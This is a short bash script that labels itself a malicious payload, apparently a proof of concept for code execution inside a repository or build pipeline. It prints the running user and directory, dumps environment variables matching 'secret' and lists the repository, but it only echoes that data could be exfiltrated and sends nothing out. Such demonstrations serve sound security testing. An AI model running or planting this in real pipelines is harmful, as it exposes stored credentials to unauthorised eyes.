#!/bin/bash
echo "=== MALICIOUS PAYLOAD EXECUTED ==="
echo "Running as user: $(whoami)"
echo "Current directory: $(pwd)"
echo "Environment variables:"
env | grep -i secret
echo "Repository contents:"
ls -la
echo "This could exfiltrate data to external server"
